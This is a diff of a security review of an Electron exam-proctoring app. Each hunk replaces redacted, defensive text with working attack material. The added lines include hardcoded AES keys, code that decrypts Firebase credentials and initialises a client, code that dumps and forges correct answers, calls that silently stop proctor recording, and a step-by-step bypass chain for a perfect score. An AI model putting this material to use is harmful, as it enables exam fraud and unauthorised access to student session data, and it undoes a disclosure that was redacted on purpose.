@@ -27,19 +27,25 @@ The core logic that matters sits in three layers:
 This was the first thing I noticed after deobfuscating `renderer.js`. The app encrypts the Firebase config and the ICE server credentials in transit — okay, fine — but then decrypts them right there in the renderer using **hardcoded AES-128 keys**:
 
 ```
-REDACTED_FIREBASE_KEY   <- decrypts Firebase API keys / auth config
-REDACTED_ICE_KEY        <- decrypts TURN/STUN ICE server credentials
+"keysefghijkldesk"   ← decrypts Firebase API keys / auth config
+"icesefghijklmnop"   ← decrypts TURN/STUN ICE server credentials
 ```
 
 Both are sitting in the obfuscated string table `_0x2d70`, recoverable in about 30 seconds by just running the deobfuscation loop in a browser console. To make it worse, the mode is **AES-ECB** — no IV, fully deterministic. Even if you didn't know the key, ECB leaks block structure patterns. But you do know the key, because it's in the app.
 
-Once an attacker recovers the Firebase config and token flow, they can potentially initialize their own Firebase client and interact with the Realtime Database that stores proctoring state, student session metadata, and exam assignments. The public copy of this review intentionally redacts working key material and exploit-ready initialization code.
+Once you have the Firebase config, you can call `firebase.initializeApp()` with it yourself, authenticate using the custom token the app fetches (also decryptable the same way), and at that point you have read/write access to the Firebase Realtime Database — which stores live proctor feeds, student session state, exam assignments, everything.
 
 ```js
-// Redacted public example:
-// 1. Remove hardcoded client-side keys.
-// 2. Do not decrypt privileged service configuration in renderer code.
-// 3. Enforce scoped Firebase security rules server-side.
+// Pull the key out of the string table, decrypt the server response yourself:
+const key = CryptoJS.enc.Utf8.parse("keysefghijkldesk");
+const plain = CryptoJS.AES.decrypt(serverResp, key, {
+    mode: CryptoJS.mode.ECB,
+    padding: CryptoJS.pad.Pkcs7
+}).toString(CryptoJS.enc.Utf8);
+
+const fbConfig = JSON.parse(plain).FirebaseKeys;
+firebase.initializeApp(fbConfig);
+// you're in. DB is open.
 ```
 
 ---
@@ -61,9 +67,9 @@ window.addEventListener('message', function (event) {
 }, false);
 ```
 
-So any script running anywhere in the page — a reflected XSS on the exam portal, a rogue iframe, or an injected script — can send a matching message and silently stop webcam/screen recording. The proctor's feed just goes dead. No error, no alert, nothing logged on the student side either.
+So any script running anywhere in the page — a reflected XSS on the exam portal, a rogue iframe, even a bookmarklet — can fire `postMessage({ msg: "stop" }, "*")` and it kills all webcam and screen recording silently. The proctor's feed just goes dead. No error, no alert, nothing logged on the student side either.
 
-The same trust issue also affects other lifecycle actions, including exam-start state and navigation commands. The fix is to validate `event.origin`, define a strict message schema, and reject all commands that do not come from the expected exam origin.
+You can also send `"actualstart"` to trick the main process into thinking the exam has actually begun (which unlocks certain UI states), or use `"opentab"` with an arbitrary `data.url` to navigate the locked browser to a URL of your choice.
 
 ---
 
@@ -80,7 +86,7 @@ window.EndTest = function () {
 }
 ```
 
-These get attached to the exam page's `window` before the page even loads. That exposes privileged proctoring controls to page-level scripts. A safer design would keep these controls inside the preload's isolated context and expose only a narrow, validated API.
+These get attached to the exam page's `window` before the page even loads. So anyone in the DevTools console, or any XSS payload, can just call `window.EndTest()` and proctoring stops. Or call `window.StartTest({...})` with fake student info to re-initialize the session with forged metadata.
 
 ---
 
@@ -100,17 +106,19 @@ QuestionObj.isAnswerCorrect = isAnswerCorrect;
 
 The entire question object, including `CorrectAns`, is loaded from the server at exam start and stored in `localStorage` as `ExamQuestionsObj`. Correctness is then evaluated right here on the client. The `isAnswerCorrect` flag is set by the student's own browser and gets submitted back to the server inside `ExamAnswersJSON` — the server appears to trust it as-is.
 
-At a high level, any client-side script with access to that local state can inspect answer metadata before submission:
+Dump it:
 ```js
-// Redacted: do not expose correct-answer fields to the client.
-// The server should grade submissions independently.
+let exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
+exam.QuestionsJSON.forEach(q => console.log(q.question, "→", q.CorrectAns));
 ```
 
-The dangerous part is not only exposure; it is trust. If the server accepts correctness flags calculated by the browser, a manipulated client can submit forged scoring metadata. The fix is to keep correct answers and grading logic server-side:
+Instant cheatsheet. Then auto-submit a perfect paper:
 ```js
-// Server-side grading model:
-// client submits selected option IDs only
-// server compares those selections against answer keys stored on the backend
+exam.QuestionsJSON.forEach(q => {
+    q.selectedOpt = q.CorrectAns;
+    q.isAnswerCorrect = true;
+});
+localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
 ```
 
 ---
@@ -147,17 +155,19 @@ On top of that, `remote.getGlobal('ProcessesRunning')` pulls a main-process glob
 
 ### 7. Firebase field writes aren't validated server-side
 
-The renderer updates the student WebRTC/session record in Firebase, and that payload includes fields like `isExamEnded`, `isOnline`, `AllowScreenRecord`, and `proctorId`. These are all set by the client and written directly to the DB.
+The renderer calls `firebase.database().ref('webrtc/students/' + studentFirebaseIdKey).update({...})` and that payload includes fields like `isExamEnded`, `isOnline`, `AllowScreenRecord`, `proctorId`. These are all set by the client and written directly to the DB.
 
-If the Firebase security rules are broad, a client could directly modify session-state fields that should be controlled by the backend:
+If the Firebase security rules are anything close to the default for Realtime Database (which is often authenticated-write-all, especially for teams building fast), a student can just write:
 
 ```js
-// Redacted public example:
-// session visibility, recording permission, proctor assignment,
-// and exam-ended flags must not be writable by the student client.
+firebase.database().ref('webrtc/students/' + myKey).update({
+    isOnline: false,          // disappear from proctor's view
+    AllowScreenRecord: false, // disable screen recording flag
+    isExamEnded: false        // prevent forced termination
+});
 ```
 
-If rules are not scoped per user/session, the impact can extend beyond one student record. This should be enforced with least-privilege database rules and server-side validation.
+Even without that — just using the credentials recovered from finding #1 — you could manipulate other students' Firebase entries if the rules aren't scoped per-user.
 
 ---
 
@@ -169,7 +179,7 @@ It's 15KB. Checks three things: CPUID hypervisor bit, SMBIOS/BIOS vendor strings
 - Custom SMBIOS strings are supported by all major hypervisors
 - Minimal VM installs don't have the guest driver files anyway
 
-And even if the binary detects a VM, it is still just a child process whose result is consumed by the Electron app. Without stronger attestation, this kind of check should be treated as a weak signal rather than a security boundary.
+And even if the binary detected a VM, it's just a child process. The Electron main reads its exit code. You can patch the binary's return or intercept the IPC call. There's no kernel-level attestation here.
 
 ---
 
@@ -191,16 +201,18 @@ Inside `renderer-WebRtc.js`, during WebRTC initialization, the app calls `naviga
 
 ---
 
-## Risk chaining scenario
+## If you wanted to chain this into a complete proctoring bypass + perfect score
 
-Several of the findings become more serious when combined. Client-side answer exposure, weak renderer trust boundaries, unvalidated messaging, and client-writable session state can undermine both exam integrity and proctoring visibility. This public report intentionally avoids publishing a step-by-step bypass chain. The defensive takeaway is direct:
+No root, no exploits needed — just access to the exam app running normally:
 
-1. Keep answer keys and scoring logic on the server.
-2. Validate every `postMessage` origin and message schema.
-3. Remove privileged globals from the page context.
-4. Scope Firebase rules to the authenticated student/session.
-5. Disable DevTools and enforce integrity checks from the main process.
-6. Treat renderer code as hostile, especially in Electron.
+1. Open DevTools (F12, or via the debug flag bypass)
+2. Deobfuscate the renderer string table → pull `"keysefghijkldesk"` → you now have Firebase creds
+3. Pull `localStorage.getItem("ExamQuestionsObj")` → you have every question and its correct answer before you even start
+4. Mutate the question objects, set `isAnswerCorrect = true`, `selectedOpt = CorrectAns` for all of them, write back to localStorage
+5. Fire `window.parent.postMessage({ msg: "stop" }, "*")` → recording stops, proctor feed goes dark
+6. Submit → server gets `ExamAnswersJSON` with all correct flags set by your browser → full marks
+
+End to end. No network attack, no kernel exploit, no social engineering. Just the app working as designed, badly.
 
 ---
 
